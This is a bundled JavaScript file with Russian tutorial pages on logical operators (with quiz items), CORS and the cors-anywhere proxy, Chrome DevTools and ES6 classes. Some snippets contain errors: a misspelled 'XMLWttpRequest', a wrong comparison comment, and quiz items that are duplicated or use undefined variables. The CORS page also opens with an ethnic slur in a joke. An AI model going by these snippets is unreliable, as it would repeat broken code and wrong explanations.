**&&** operand2~\n\nВернемся к примеру 1:\n\n~~~js\nvar apple = {\n  color: 'yellow',\n  shape: 'square'\n}\n\nvar appleIsRed = apple.color === 'red'\nvar appleIsRound = apple.shape === 'round'\n~~~\n\nЕсли оба операнда являются логическими выражениями (или логическими переменными), то результат будет иметь тип данных ~boolean~.\n\n~~~js\nvar appleIsRedAndRound = appleIsRed && appleIsRound\n~~~\n\n§§§§ Demo | boolean_03_template §§§§\n\nВ следующих примерах мы используем логический оператор **~&&~** к операндам, которые являются **логическими выражениями**.\nЛогические выражения мы строим с помощью операторов сравнения.\n\n◘◘![ico-25 coffee] ** 4**◘◘\n\n~~~js\n5 > 8 && 4 < 5   // false  \n// explanation:\n5 > 8            // false\n4 < 5            // true\nfalse && true    // false\n~~~\n\n◘◘![ico-25 coffee] ** 5**◘◘\n\n~~~js\n8 < 5 && 4 < 5   // false\n// explanation:\n8 > 5            // false\n4 < 5            // true\nfalse && true    // false\n~~~\n\n◘◘![ico-25 coffee] ** 6**◘◘\n\n~~~js\nvar x = 4, y = 10, z = 8\n\nx > y && z < y   // false\n// explanation:\nx > y            // false,\nz < y            // true,\nfalse && true    // false\n~~~\n\n◘◘![ico-25 coffee] ** 7**◘◘\n\n~~~js\nvar x = 4, y = 10, z = 8\n\nx < y && z < y   // true\n// explanation:\nx < y            // true,\nz < y            // true,\ntrue && true     // true\n~~~\n\nОднако это JS, и мы можем применять логические операторы к данным любого типа.\nВ этом случае начинает работать [►►►**неявное приведение типов**►►►](page/Implicit-type-conversion), т.е. операнды приводятся к логическому типу, после чего вычисляется значение выражения следующим образом: если логическое значение первого операнда (после приведения его к логическому типу данных) ~false~, то возвращается значение первого операнда, в противном случае возвращается значение второго операнда.\n\n§§§§ Demo | boolean_04_template §§§§\n\nДля более сложных выражений:\n\n![](illustrations/logical-operators.svg)\n\nОбратите внимание на тот факт, что использование логического оператора **~&&~** не определяет однозначно тип результата.\nТип данных значения, которое будет получено движком в результате вычисления выражения, зависит от типа данных операндов.\n\n§§§§ Demo | boolean_05_template §§§§\n\n_________________________________________________\n\n### ![ico-25 icon] Логическое сложение\n\nСинтаксис: ~operand1 **||** operand2~\n\n§§§§ Demo | boolean_06_template §§§§\n\n◘◘![ico-25 coffee] ** 8**◘◘\n\n~~~js\n5 > 8 || 4 < 5   // true\n\n// explanation:\n\n5 > 8            // false,\n4 < 5            // true,\nfalse || true    // true\n~~~\n\n◘◘![ico-25 coffee] ** 9**◘◘\n\n~~~js\n5 > 8 || 4 > 5   // false\n\n// explanation:\n\n5 > 8            // false,\n4 > 5            // false,\nfalse || false   // false\n~~~\n\n◘◘![ico-25 coffee] **10**◘◘\n\n~~~js\nvar x = 4, y = 10, z = 8\n\nx > y || z < y   // true\n\n// explanation:\n\nx > y            // false,\nz < y            // true,\nfalse || true    // true\n~~~\n\n◘◘![ico-25 coffee] **11**◘◘\n\n~~~js\nx > y || z > y   // false\n\n// explanation:\n\nx > y            // false,\nz > y            // false,\nfalse || false   // false\n~~~\n\nИтак, логическое сложение работает по принципу: если после приведения к типу данных **~boolean~** **хотя бы одного из операндов** будет получено **~true~**, то все выражение будет иметь значение **~true~**. Поскольку значения остальных операндов уже не изменят результат, то движок останавливается на первом же операнде, который после приведения типов даст **~true~**. Однако оператор **~||~** возвращает не **~true~**, а исходное значение операнда.\n\n![](illustrations/logical-operators-1.svg)\n\n◘◘![ico-25 coffee] **12**◘◘\n\n~~~js\nvar object = {\n  color: 'yellow',\n  shape: 'square',\n  size: 100\n}\n\nvar test = object.color === 'red' || object.shape === 'circle' || object.size > 50\n~~~\n\n~~~console\ntrue\n~~~\n_________________________________________________________________________\n\n![ico-25 exclamation] Независимо от типа данных и значения переменной **~test~**:\n\n~~~js\n!test || !!test    // всегда  true\n\n!test && !!test    // всегда  false\n~~~\n\n_________________________________________________________________________\n\n### ![ico-25 icon] Tests\n\n◘◘![ico-25 hw] ** 1**◘◘\n\n~~~js\nvar x = undefined\n~~~\n\n→→→ x ◧ !x | undefined, null, true, false | true →→→\n\n◘◘![ico-25 hw] ** 2**◘◘\n\n~~~js\nvar x = undefined\n~~~\n\n→→→ x && !x | undefined, null, true, false | undefined →→→\n\n◘◘![ico-25 hw] ** 3**◘◘\n\n~~~js\nvar x = null\n~~~\n\n→→→ x ◧ !x | undefined, null, true, false | true →→→\n\n◘◘![ico-25 hw] ** 4**◘◘\n\n~~~js\nvar x = null\n~~~\n\n→→→ x && !x | undefined, null, true, false | null →→→\n\n◘◘![ico-25 hw] ** 5**◘◘\n\n~~~js\nvar x = NaN\n~~~\n\n→→→ x ◧ !x | NaN, null, true, false | true →→→\n\n◘◘![ico-25 hw] ** 6**◘◘\n\n~~~js\nvar x = NaN\n~~~\n\n→→→ x && !x | NaN, null, true, false | NaN →→→\n\n◘◘![ico-25 hw] ** 7**◘◘\n\n~~~js\nvar x = 5\n~~~\n\n→→→ x ◧ !x | NaN, null, 5, true, false | 5 →→→\n\n◘◘![ico-25 hw] ** 8**◘◘\n\n~~~js\nvar x = 5\n~~~\n\n→→→ x && !x | NaN, null, 5, true, false | false →→→\n\n\n◘◘![ico-25 hw] ** 9**◘◘\n\n~~~js\nvar x = 'Hi!'\n~~~\n\n→→→ x ◧ !x | undefined, 'Hi!', true, false | Hi! →→→\n\n\n◘◘![ico-25 hw] **10**◘◘\n\n~~~js\nvar x = 'Hi!'\n~~~\n\n→→→ x && !x | undefined, 'Hi!', true, false | false →→→\n\n◘◘![ico-25 hw] **11**◘◘\n\n~~~js\nvar x = ''\n~~~\n\n→→→ x ◧ !x | undefined, '\"\"', true, false | true →→→\n\n\n◘◘![ico-25 hw] **12**◘◘\n\n~~~js\nvar x = ''\n~~~\n\n→→→ x && !x | undefined, '\"\"', true, false | \"\" →→→\n\n\n◘◘![ico-25 hw] **13**◘◘\n\n~~~js\nvar x = 4, y = 10\n~~~\n\n→→→ (x > y) ◧ (x < 5) | 4, 10, true, false | true →→→\n\n\n◘◘![ico-25 hw] **14**◘◘\n\n~~~js\nvar x = 4, y = 10\n~~~\n\n→→→ (x > y) && (x < 5) | 4, 10, true, false | false →→→\n\n\n◘◘![ico-25 hw] **15**◘◘\n\n~~~js\nvar students = ['Piter', 'Anna', 'Demid', 'Josef']\n~~~\n\n→→→ students.length && students[1] | 4, 'Piter', 'Anna', 'Demid', 'Josef', true, false | Anna →→→\n\n\n◘◘![ico-25 hw] **16**◘◘\n\n~~~js\nvar students = ['Piter', 'Anna', 'Demid', 'Josef']\n~~~\n\n→→→ students.length ◧ students[2] | 4, 'Piter', 'Anna', 'Demid', 'Josef', true, false | 4 →→→\n\n\n◘◘![ico-25 hw] **17**◘◘\n\n~~~js\nvar students = ['Piter', 'Anna', 'Demid', 'Josef']\n~~~\n\n→→→ students.length > 4 ◧ students[2] | 4, 'Piter', 'Anna', 'Demid', 'Josef', true, false | Demid →→→\n\n\n◘◘![ico-25 hw] **18**◘◘\n\n~~~js\nvar array = [true, 'Google', NaN, undefined]\n~~~\n\n→→→ array.length > 4 ◧ typeof array[2] | 4, 'string', 'number', 'boolean', 'object', true, false | number →→→\n\n◘◘![ico-25 hw] **19**◘◘\n\n~~~js\nvar array = [true, 'Google', NaN, undefined]\n~~~\n\n→→→ array.length > 4 ◧ typeof array[2] | 4, 'string', 'number', 'boolean', 'object', true, false | number →→→\n\n\n◘◘![ico-25 hw] **20**◘◘\n\n~~~js\nvar alpha = NaN\nvar betta = typeof alpha\n~~~\n\n→→→ b === 'number' | NaN, 'number', 'boolean', true, false | true →→→\n\n\n◘◘![ico-25 hw] **21**◘◘\n\n~~~js\nvar alpha = NaN\nvar betta = typeof alpha === 'string'\n~~~\n\n→→→  !a && !b | NaN, true, false | true →→→\n"},29787:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] AJAX\n\n_______________________\n\n## ![ico-25 icon] CORS\n\n**Cross-origin resource sharing**\n\n☼☼☼ Вдерся на чужий домен? - ти москаль, а не джентльмен ☼☼☼\n\n^^Кросс-доменное использование ресурсов (**CORS**) - это рабочий проект _W3C_, который определяет, как браузер и сервер должны взаимодействовать при доступе к внешним ресурсам (с других доменов)^^\n\n^^Суть CORS заключается в использовании дополнительных заголовков, позволяющих браузеру и серверу \"опознать\" друг друга, чтобы определить, может ли запрос быть удовлетворен^^\n\n^^**~XMLHttpRequest~** и **~Fetch API~** следуют политике одного источника^^\n^^(**_same-origin policy_**)^^\n^^т.е. если приложения не используют CORS-заголовки, они могут запрашивать ресурсы только с того домена, с которого были загружены^^\n\n____________________________________\n\n### ![ico-20 icon] Preflight request\n\n[Предварительный запрос](external/mdn-preflight-request) автоматически отправляется браузером\n\nЭтот запрос использует три заголовка:\n\n| ![ico-20 green-ok] ^^Access-Control-Request-Method^^<br>![ico-20 green-ok] ^^Access-Control-Request-Headers^^<br>![ico-20 green-ok] ^^Origin^^ |\n\n ^^^[Access-Control-Request-Method]\n\n![ico-20 pin]сообщает серверу, какой метод HTTP будет использоваться при выполнении фактического запроса\n![ico-20 pin]В ответ сервер должен прислать в заголовке **~Access-Control-Allow-Methods~** список методов (GET, POST, PUT, DELETE...), которые он поддерживает\n\n^^^\n\n^^^[Access-Control-Request-Headers]\n\n![ico-20 pin] Заголовок **~Access-Control-Allow-Headers~**, возвращаемый сервером в ответ на ~preflight request~, содержит перечень заголовков, которые можно использовать при отправке реального запроса\n![ico-20 pin] При использовании пользовательского заголовка в запросе (например, _x-authentication-token_) сервер должен вернуть его в заголовке **~Access-Control-Allow-Headers~**, иначе запрос будет заблокирован\n\n^^^\n\n^^^[Origin]\n\n![ico-20 warn] Валидный CORS-запрос всегда содержит заголовок **Origin**\n![ico-20 warn] Заголовок **Origin** добавляется браузером (его нельзя подделать)\n\nЗначение этого заголовка описывает происхождение запроса:\n\n| ![ico-20 pin] | ^^протокол ( http, ftp, file, about...  )^^ |\n| ![ico-20 pin] | ^^домен ( например, tweet.com )^^ |\n| ![ico-20 pin] | ^^порт ( включается в заголовок только в том случае, если это не порт по умолчанию, например 81 )^^ |\n\n^^^\n\n_______________________________________________\n\n### ![ico-20 icon] CORS-заголовки ответа\n\nВсе CORS-заголовки **_ответа_** сервера имеют префикс «**Access-Control-**»\n\n^^^[Access-Control-Allow-Origin]\n\n![ico-20 warn] **required** обязательный\n\n__________________\n\n![ico-20 pin] этот заголовок должен быть включен во все валидные ответы CORS\n![ico-20 pin] отсутствие этого заголовка приведет к сбою запроса CORS\n![ico-20 pin] Значение заголовка может либо таким же, как и заголовок запроса **Origin**, либо ~ *~, что означает, что запросы разрешены из любого источника\n\n^^^\n\n^^^[Access-Control-Expose-Headers]\n\noptional (необязательный)\n________________________\n\n![ico-20 pin] Во время запроса CORS можно получить доступ только к простым заголовкам ответов\n![ico-20 pin] Все остальные заголовки будут недоступны\n![ico-20 pin] По умолчанию клиенту открыты только 6 \"простых\" заголовков\n\n| **Простые заголовки ответов:** |\n| ![ico-20 green-ok] Cache-Control |\n| ![ico-20 green-ok] Content-Language |\n| ![ico-20 green-ok] Content-Type |\n| ![ico-20 green-ok] Expires |\n| ![ico-20 green-ok] Last-Modified |\n| ![ico-20 green-ok] Pragma |\n\nВ заголовке ~Access-Control-Expose-Headers~ ответа сервера перечисляются заголовки ответа, которые будут доступны клиенту\n\n^^^\n\n^^^[Access-Control-Allow-Credentials]\n\noptional (необязательный)\n\n________________________\n\n![ico-20 warn] Стандартные запросы CORS не отправляют и не устанавливают файлы **_cookie_** по умолчанию. Это нужно сделать самостоятельно:\n\n\n![ico-20 pin] **XMLWttpRequest**\n\n~~~js\nvar request = new XMLWttpRequest()\nrequest.withCredentials = true\n~~~\n\n![ico-20 pin] **Fetch API**\n\n~~~js\nfetch(url, {\n  ...,\n  credentials: 'include'\n})\n~~~\n\n![ico-20 warn] Чтобы это cработало, сервер также должен вернуть заголовок ~Access-Control-Allow-Credentials~ со значением ~true~\n\n^^![ico-20 pin] При этом в запрос будут включены cookie-файлы удаленного домена, а удаленный домен будет писать свои cookie на клиенте^^\n^^![ico-20 pin] В силу действия политики одного и того же происхождения эти cookie недоступны вашему скрипту, если он запущен с другого домена^^\n^^![ico-20 pin] Они контролируются только удаленным доменом^^\n\n^^^\n\n^^^[Origin, Host, Referer]\n\n![ico-20 pin] В заголовках ответа сервера ( объект **~headers~** ) есть свойство **~Host~** ( _куда был направлен запрос_ ) и свойство **~Origin~** ( домен, _с которого пришел запрос_ )\n![ico-20 pin] Свойство **~Referer~** указывает _полный адрес_, с которого пришел запрос\n![ico-20 pin] ^^Если сделать запрос с пустой страницы ( не имеющей адреса в сети ), то в заголовках ответа сервера свойство **~Origin~** будет иметь значение ~null~, а свойство **~Referer~**  будет отсутствовать^^\n\n^^^\n\n__________________________________\n\n## ![ico-25 icon] Proxy for CORS request\n\nПопробуйте запустить следующий код в консоли пустой вкладки (about:blank)\n\n~~~js\nfetch('http://humor.fm/uploads/posts/2016-03/17/umndflr0wjc.jpg')\n  .then(response => response.text())\n  .then(response => console.log(response))\n~~~\n\n![ico-20 error] Ответ будет заблокирован браузером\n\n~~~console\nAccess to fetch at 'http://humor.fm/uploads/posts/2016-03/17/umndflr0wjc.jpg' from origin 'null' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource. If an opaque response serves your needs, set the request's mode to 'no-cors' to fetch the resource with CORS disabled.\n~~~\n\nВо вкладке **Network** отладчика можно посмотреть заголовки ответа:\n\n~~~console\n▼ Response Headers\n    Accept-Ranges: bytes\n    Cache-Control: max-age=604800\n    Content-Length: 127387\n    Content-Type: image/jpeg\n    Date: Tue, 19 Mar 2019 08:30:36 GMT\n    ETag: \"56ea8363-1f19b\"\n    Expires: Tue, 26 Mar 2019 08:30:36 GMT\n    Last-Modified: Thu, 17 Mar 2016 10:13:55 GMT\n    Server: nginx/1.12.2\n~~~\n\nКак мы видим, ~Access-Control-Allow-Origin~ отсутствует, что и становится причиной блокирования браузером ответа\n\nТеперь воспользуемся готовым прокси-сервером ![ico-20 smile]\n\nДля этого добавим в запросе url прокси: **~https://cors-anywhere.herokuapp.com/~**\n\n~~~js\nfetch('https://cors-anywhere.herokuapp.com/http://humor.fm/uploads/posts/2016-03/17/umndflr0wjc.jpg')\n  .then(response => response.blob())\n  .then(blob => document.body.appendChild(document.createElement('img')).src = URL.createObjectURL(blob))\n~~~\n\nТеперь наш запрос благополучно проходит, на странице появляется картинка, а во вкладке **Network** можно увидеть такие заголовки ответа:\n\n~~~~console\n▼ Response Headers\n    Accept-Ranges: bytes\n    Access-Control-Allow-Origin: *\n    Access-Control-Expose-Headers: server,date,content-type,content-length,last-modified,connection,etag,expires,cache-\n    control,accept-ranges,x-final-url,access-control-allow-origin\n    Cache-Control: max-age=604800\n    Connection: keep-alive\n    Content-Length: 127387\n    Content-Type: image/jpeg\n    Date: Tue, 19 Mar 2019 08:31:09 GMT\n    Etag: \"56ea8363-1f19b\"\n    Expires: Tue, 26 Mar 2019 08:31:09 GMT\n    Last-Modified: Thu, 17 Mar 2016 10:13:55 GMT\n    Server: nginx/1.12.2\n    Via: 1.1 vegur\n    X-Final-Url: http://humor.fm/uploads/posts/2016-03/17/umndflr0wjc.jpg\n    X-Request-Url: http://humor.fm/uploads/posts/2016-03/17/umndflr0wjc.jpg\n~~~~\n\nПрокси-сервер добавил необходимые заголовки к ответу, и браузер вернул нам ответ - файл изображения получен ![ico-20 smile]\n"},75032:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 icon] Chrome DevTools\n\n[![ico-20 link] Chrome DevTools](external/dev-tools)\n_____________________________________________________________\n\n## ![ico-25 icon] Sources\n\nОткрываем [**страницу**](samples/02)\n\nПереходим на вкладку **Sources** панели разработчика:\n![](illustrations/lesson-01-1.png)\n\nСлева видим панель навигации:\n@@@@\n![](illustrations/lesson-01-nav-panel.png)\n<br><br>Для просмотра кода загруженной страницы используем кнопку **~>>~** и открываем **_Pages_**.<br>Теперь в панели навигации вы видите структуру проекта, и можете выбрать файл для просмотра.<br>Выбираем файл проекта, содержимое которого будет отображаться в центре (**index02.js**).\n@@@@\n\nВ правой части вы видите панель самого дебаггера:\n@@@@ 1\n![](illustrations/lesson-01-debugger.png)\n@@@@\n_________________________________________________________\n\nВ отладчике можно не только работать с кодом открытой страницы.\n\nМожно создать свой фрагмент кода, который хотите отладить.\n\n### ![ico-20 icon] Snippet\n\nС помощью той же кнопки **~>>~** в панели навигации выберем **_Snippets_**.\n\n**Snippet** - это фрагмент кода, который достаточно долго сохраняется в браузере под тем именем, которое вы ему дадите.\n\nДля добавления нового фрагмента кода кликните на кнопке •• + New Snippet •• в панели навигации слева, и дайте название своему сниппету.\n\n![](illustrations/lesson-01-2.png)\n\n@@@@\nДалее вы сможете вставить код сниппета в центре, сохранить изменения (Ctrl+S) и запустить код сниппета на исполнение ► **Ctrl + Enter**.<br><br>^^Если изменения не были сохранены, то в панели навигации (слева) измененный сниппет будет отмечен символом ~ * ~.^^\n![](illustrations/lesson-01-snippet.png)\n@@@@\n\n________________________________________________________________________\n\n## ![ico-25 icon] Debugger\n\nНаиболее важные секции отладчика, которые вы должны будете освоить в первую очередь:\n\n| Watch | Call Stack | Scope | Breakpoints |\n\nДля отслеживания значений переменных используем секцию **Watch**.\n@@@@\nВ этой секции вы можете добавить имена переменных, значения которых хотите отслеживать.\n![](illustrations/lesson-01-watch.png)\n@@@@\n\nНо для того, чтобы видеть, как меняются эти значения в процессе выполнения кода, нужно расставить точки останова (**~Breakpoints~**).\n\n@@@@\nЭто достаточно легко сделать непосредственно в коде сниппета.<br>Все строки кода пронумерованы, и достаточно кликнуть на номере строки, чтобы установить точку останова.\n![](illustrations/lesson-01-breakpoints.png)\n@@@@\n\nПосле запуска кода сниппета (► **Ctrl + Enter**) движок будет выполнять строчку за строчкой, пока не дойдет до очередной точки прерывания (**~Breakpoint~**).\nЗдесь движок приостановит выполение кода, вы получите возможность посмотреть текущие значения переменных, которые вы отслеживаете, а затем возобновить выполение кода с того места, на котором вы остановились.\nТакже можно внести изменения в код, сохранить внесенные изменения (**~Ctrl + S~**) и возобновить выполнение кода. После возобновления будет работать новая версия кода.\n\n@@@@\n![](icons/debugger-panel.png)\nДля возобновления выполнения кода используем кнопку ![ico-40 debug-button].\n@@@@\n\n![ico-25 warn] После установки ~breakpoints~ нужно перезагрузить страницу ![reload].\n\n![](illustrations/lesson-01-debugger.gif)\n\n_______________________________________________________\n\n![ico20] Mожно отслеживать изменение значений переменных еще и  в секции  **~Scope~**  дебаггера:\n• Local - локальные переменные исполняемой функции.\n• Block - переменные контекста вызова исполняемой функции.\n\n![ico-20 warn] Следите, какая функция сейчас выполняется, в секции **~Call Stack~**.\n\n_____________________________________________________________________________\n\n### ![ico-25 icon] Event Listener Breakpoints\n\nВ  **Chrome DevTools**  можно также приостанавливать выполнение кода, когда происходят события DOM\n\n![](illustrations/Chrome-devtools-breakpoints.gif)\n\n_______________________________________________________\n\n[![ico-70 youtube]](https://youtu.be/PQYG2aJf6uI/)\n"},80040:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Классы\n\n**ES6 (ECMAScript 2015)**\n\n^^Прокси для работы с прототипной моделью наследования^^\n\nПоскольку прототипная модель наследования базируется на функции (конструкторе), то прокси-объект ~**class**~ является, по сути, оберткой для этой функции-конструктора.\n\nЭта обертка значительно облегчает построение довольно сложных цепочек наследования за счет более простого и удобного интерфейса прокси-объекта.\n\nОднако следует помнить, что это всего лишь целлофан, в который завернули все тот же конструктор.\n\n____________________________________________________________________\n\n## ![ico-25 icon] Синтаксис\n\n![ico-20 warn] Код внутри тела класса всегда выполняется в **~strict mode~**\n^^даже если вы не использовали директиву **_~use strict~_**^^\n\n![ico-20 memo] \"Тело\" класса всегда заключено в фигурные скобки ~{ }~\n\n~~~js\nclass User {\n  ...\n}\n~~~\n\n![ico-20 memo] Внутри фигурных скобок объявляется конструктор (**~constructor~**)\n\n~~~js\nclass User {\n  constructor () {\n    ...\n  }\n}\n~~~\n\nи методы класса:\n\n~~~js\nclass User {\n  constructor (name) {\n    this.name = name\n  }\n\n  getUserInfo () {\n    console.log(this.name)\n  }\n}\n~~~\n\n![ico-20 memo] Метод **_constructor_** создает и инициализирует экземпляра класса\n![ico-20 memo] Все собственные свойства экземпляра должны быть объявлены в конструкторе  **~constructor()~**\n![ico-20 memo] Создаваемые в конструкторе класса свойства и методы могут быть **приватными** и **публичными**\n^^( как и в обычном конструкторе )^^\n\nВ обычном конструкторе контекстом вызова приватных методов будет глобальный объект ~window~\n![ico-20 warn] В конструкторе класса контекстом вызова приватных методов будет ~undefined~\n\n____________________________________\n\n◘◘![ico-25 cap] **Пример 1**◘◘\n\n~~~js\nclass User {\n  constructor (name) {\n    const privateVar = prompt('Set privateVar value:')\n\n    function showPrivate () {\n      console.log(`Ай-яй-яй, у меня контекст вызова ${this}`)\n      console.log(`Зато я вижу приватную переменную: ${privateVar}`)\n    }\n    this.name = name || 'Бегемот'\n    this.show = function () {\n      showPrivate ()\n    }\n  }\n}\n\nconst user = new User('Крокодил')\nuser.show()\n~~~\n\n◘◘**Result**◘◘\n\n~~~console\n\nАй-яй-яй, у меня контекст вызова undefined\nЗато я вижу приватную переменную: 789\n~~~\n\nДля того, чтобы избавиться от иллюзий по поводу \"классов\" в JS,\nсоздадим аналогичный экземпляр с помощью обычного конструктора\n\n~~~js\n\nfunction User (name) {\n  const privateVar = prompt('Set privateVar value:')\n  function showPrivate () {\n    console.log(`Ай-яй-яй, у меня контекст вызова ${this}`)\n    console.log(`Зато я вижу приватную переменную: ${privateVar}`)\n  }\n  this.name = name || 'Бегемот'\n  this.show = function () {\n    showPrivate ()\n  }\n}\n\nconst user = new User('Крокодил')\nuser.show()\n~~~\n\n◘◘**Result**◘◘\n\n~~~console\n\nАй-яй-яй, у меня контекст вызова [object Window]\nЗато я вижу приватную переменную: 789\n~~~\n\nВыведем в консоль оба варианта **user** и найдем те косметические отличия, которые там должны быть ![ico-20 smile]\n\n••constructor: class User    /    constructor: ƒ User(name)••\n\n_______________________________________________\n\n## ![ico-25 icon] class declaration\n\n\n![ico-20 error] **hoisting**\n\n^^объявление класса дожно быть раньше первого обращения к нему^^\n\nКлассы - это специальные функции-\"обертки\", в которые \"заворачивают\" конструктор\n\n◘◘![ico-25 cap] **Пример 2**◘◘\n\n~~~js\nclass Picture {\n  constructor (url, width) {\n    this.elem = document.createElement('img')\n    this.elem.src = url\n    this.width = width\n  }\n}\n\ntypeof Picture  // \"function\"\n~~~\n\n• ![ico-20 warn] ^^объявленный класс невозможно удалить динамически, без перезагрузки страницы^^\n• ^^В этом примере идентификатор  **_~Picture~_**  уже занят, и никакие магические заклинания не помогут переопределить его  содержание^^\n\n^^если обычный конструктор JS можно вызвать и как функцию, и как конструктор ( с ключевым словом **~new~** ), ^^\n^^то конструктор класса вызвать без ключевого слова **~new~**  нельзя - будет сгенерировано исключение **_~TypeError~_**^^\n\n~~~js\nconst x = new Picture('http://www.radioactiva.cl/wp-content/uploads/2018/05/pikachu.jpg', 200)\ndocument.body.appendChild(x.elem)\n~~~\n\n__________________________________________________\n\n## ![ico-25 icon] class expression\n\n**class expression может быть именованным или аниномным**\n\n### ![ico-20 icon] Примеры именованных классов\n\n◘◘![ico-25 cap] **Пример 3**◘◘\n\n~~~js\nconst Picture = class {\n  constructor (url = 'https://cdn.pastemagazine.com/www/articles/GrinchPOster_header.jpg') {\n    this.elem = document.body\n      .appendChild(document.createElement('img'))\n    this.elem.src = url\n  }\n}\n\nconsole.dir(Picture)\n~~~\n\n◘◘**Результат в консоли:**◘◘\n\n~~~console\n\n▼ class Picture\n    arguments: (...)\n    caller: (...)\n    length: 0\n    name: \"Picture\"\n  ► prototype: {constructor: ƒ}\n  ► __proto__: ƒ ()\n~~~\n\nОднако если мы создадим экземпляр этого класса, и посмотрим на него в консоли, то мы увидим, что имя класса отсутствует\n\n~~~js\nlet sample = new Picture\n\nconsole.log(sample)\n~~~\n\n◘◘**Результат в консоли:**◘◘\n\n~~~console\n\n▼ Picture {elem: img}\n    elem: img\n  ▼ __proto__:\n      ► constructor: class\n      ► __proto__: Object\n~~~\n\n_____________________________________________________________\n\n◘◘![ico-25 cap] **Пример 4**◘◘\n\n~~~js\nconst Picture = class Canvas {\n  constructor (url = 'https://cdn.pastemagazine.com/www/articles/GrinchPOster_header.jpg') {\n    this.elem = document.body\n      .appendChild(document.createElement('img'))\n    this.elem.src = url\n  }\n}\n\nconsole.dir(Picture)\n~~~\n\n◘◘**Результат в консоли:**◘◘\n\n~~~console\n\n▼ class Canvas\n    arguments: (...)\n    caller: (...)\n    length: 0\n    name: \"Canvas\"\n  ► prototype: {constructor: ƒ}\n  ► __proto__: ƒ ()\n~~~\n\nА теперь создадим экземпляр этого класса и выведем его в консоль:\n\n~~~js\nconst sample = new Picture\n\nconsole.log(sample)\n~~~\n\n◘◘**Результат в консоли:**◘◘\n\n~~~console\n\n▼ Canvas {elem: img}\n    elem: img\n  ▼ __proto__:\n      ► constructor: class Canvas\n      ► __proto__: Object\n~~~\n\n~~~js\nsample instanceof Picture   // true\n~~~\n\n~~~js\nsample instanceof Canvas\n~~~\n\n••![ico-20 error] Uncaught ReferenceError: Canvas is not defined••\n\nИтак, при использовании class expression имя класса становится недоступным извне\n\nТочнее говоря, достучаться до него можно только так:\n\n~~~js\nsample.constructor.name\n~~~\n\n________________________________________________________________\n\n◘◘![ico-25 cap] **Пример 5**◘◘\n\n~~~js\nconst Sample = class Canvas {\n  constructor () {\n    this.canvas = document.body\n      .appendChild(document.createElement('canvas'))\n    this.resizeCanvas()\n    this.canvas.style.border = '1px solid #000000'\n    this.area = this.canvas.getContext('2d')\n  }\n\n  resizeCanvas (event) {\n    this.canvas.width = window.innerWidth - 30\n    this.canvas.height = window.innerHeight - 20\n  }\n\n  drawLine (points) {\n    this.area.moveTo(points[0].x, points[0].y)\n    this.area.lineTo(points[1].x, points[1].y)\n    this.area.stroke()\n  }\n}\n\nconst pict = new Sample ()\nwindow.onresize = pict.resizeCanvas.bind(pict)\n\npict.drawLine([{ x: 50, y: 50 }, { x: 250, y: 250 }])\npict.drawLine([{ x: 250, y: 250 }, { x: 100, y: 250 }])\n~~~\n\n![ico-20 pin] Чтобы получить имя класса, нужно использовать его свойство  **name**:\n\n~~~js\nconsole.log ( Sample.name ) // \"Canvas\"\n~~~\n\n________________________________________________________\n\n\n## ![ico-25 icon] get & set\n\n^^![ico-20 warn] Свойства, объявленные в конструкторе, будут собственными свойствами экземпляра^^\n\nДля создания вычисляемых свойств нужно использовать геттеры и сеттеры\n\n![ico-20 memo] С помощью ключевого слова  **~get~**  можно объявить геттер, возвращающий значение вычисляемого свойства\n\n^^Геттер будет вызываться каждый раз при обращении к свойству экземпляра^^\n\n![ico-20 memo] С помощью ключевого слова  **~set~**  можно объявить сеттер, изменяющий значение свойства\n\n^^Сеттер будет вызываться каждый раз, когда идентификатор вычисляемого свойства будет в левой части оператора присваивания^^\n\nРассмотрим упрощенный пример с canvas:\n\n◘◘![ico-25 cap] **Пример 6**◘◘\n\n~~~js\nconst Canvas = class {\n  constructor () {\n    this.canvas = document.body.appendChild(document.createElement('canvas'))\n    this.area = this.canvas.getContext('2d')\n  }\n}\n~~~\n\n^^![ico-20 speach] Добавим сеттер свойства  **~history~**^^\n\n^^Обратите внимание, что в конструкторе такого свойства нет (и не должно быть)^^\n\n~~~js\nset history (newHistory) {\n  if (!this.canvas.history) this.canvas.history = []\n  if (!Array.isArray(newHistory)) {\n    console.error('History must be array')\n    return\n  }\n  const __history = newHistory\n    .filter(x => x.points && Array.isArray(x.points))\n    if (!__history.length) {\n      console.error('History must contain points array')\n      return\n    }\n\n    this.canvas.history = __history\n}\n~~~\n\n^^Этот метод изменяет содержимое массива  **canvas._history_**, если такое свойство уже существует,^^\n^^или создает его в противном случае^^\n\n^^![ico-20 speach] Теперь добавим геттер свойства  ~history~:^^\n\n~~~js\nget history () {\n  return this.canvas.history\n}\n~~~\n\n^^![ico-20 speach] Этот метод возвращает массив  **canvas._history_**^^\n\n^^![ico-25 paper] Теперь полный код примера будет таким:^^\n\n~~~~js\nconst Canvas = class {\n  constructor () {\n    this.canvas = document.body\n      .appendChild(document.createElement('canvas'))\n    this.area = this.canvas.getContext('2d')\n  }\n\n  get history () {\n    return this.canvas.history\n  }\n\n  set history (newHistory) {\n    if (!this.canvas.history) this.canvas.history = []\n    if (!Array.isArray(newHistory)) {\n      console.error('History must be array')\n      return\n    }\n    const __history = newHistory\n      .filter(x => x.path && Array.isArray(x.path))\n    if (!__history.length) {\n      console.error('History must contain path array')\n      return\n    }\n    this.canvas.history = __history\n  }\n}\n\nlet pict = new Canvas()\n~~~~\n\n^^![ico-20 speach] Создадим свойство  **_history_**  экземпляра  **pict**, передав массив значений:^^\n\n~~~js\npict.history = [\n  { path: [{ x: 150, y: 250 }, { x: 350, y: 50 }], lineColor: 'red' },\n  { path: [{ x: 350, y: 50 }, { x: 100, y: 250 }], lineColor: 'green' },\n  \"***\",\n  { val: \"***\" }\n]\n~~~\n\n◘◘pict◘◘\n\n~~~console\n\n▼ Canvas {canvas: canvas, area: CanvasRenderingContext2D}\n  ► area: CanvasRenderingContext2D {canvas: canvas, globalAlpha: 1, globalCompositeOperation: \"source-over\", filter: \"none\", imageSmoothingEnabled: true, …}\n  ► canvas: canvas\n  ▼ history: Array(2)\n    ► 0: {path: Array(2), lineColor: \"red\"}\n    ► 1: {path: Array(2), lineColor: \"green\"}\n      length: 2\n    ► __proto__: Array(0)\n  ► __proto__: Object\n~~~\n\n^^в массив  **canvas._history_**  попали только первые два элемента ^^\n^^из массива в правой части оператора 